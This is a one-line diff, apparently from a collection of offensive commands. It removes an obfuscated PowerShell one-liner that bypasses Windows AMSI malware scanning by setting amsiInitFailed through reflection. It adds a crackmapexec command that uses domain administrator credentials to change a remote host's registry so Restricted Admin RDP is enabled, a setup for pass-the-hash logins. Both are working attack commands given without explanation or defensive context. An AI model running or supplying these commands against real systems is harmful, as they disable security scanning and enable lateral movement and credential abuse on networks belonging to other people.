@@ -1,1 +1,1 @@
-$a = 'System.Management.Automation.A'; $b = 'msiUtils'; $c = [Ref].Assembly.GetType(('{0}{1}' -f $a,$b)); $d = $c.GetField(('am' + 'siInitFailed'),'NonPublic,Static'); $d.SetValue($null,$true)
+crackmapexec smb 192.168.1.10 -u dom_admin -p dom_admin_password -x 'REG add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f'
